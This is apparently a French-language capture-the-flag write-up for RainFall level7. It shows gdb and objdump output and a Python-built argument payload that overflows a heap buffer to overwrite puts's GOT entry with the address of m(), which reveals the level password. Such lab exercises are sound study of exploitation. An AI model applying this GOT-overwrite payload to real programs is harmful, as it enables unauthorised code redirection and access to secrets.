gdb disassemble -> address puts = . reecrire a laddress got puts pour rediriger vers la foncion m() qui print la variable c (contenant le pass)

(gdb) info address m
Symbol "m" is at 0x80484f4 in a file compiled without debugging.

level7@RainFall:~$ objdump -R level7
08049928 R_386_JUMP_SLOT   puts



# Offset 20 avec payload complet
./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')


🎯 Explication simple :

Premier argument : "A"*20 + "\x28\x99\x04\x08"

    "A"*20 = 20 lettres A pour remplir l'espace

    "\x28\x99\x04\x08" = l'adresse 0x08049928 (GOT de puts)

→ Ça overflow le premier buffer pour changer où le deuxième buffer pointe

Deuxième argument : "\xf4\x84\x04\x08"

    "\xf4\x84\x04\x08" = l'adresse 0x080484f4 (fonction m())

→ Maintenant que le deuxième buffer pointe vers la GOT, ça écrit l'adresse de m() dans la GOT de puts
🎪 Résultat :

Quand le programme appelle puts(), il appelle en réalité m() qui affiche le password !

C'est comme changer l'adresse dans un carnet d'adresses pour que quand quelqu'un cherche "puts", il trouve "m()" à la place ! 🎉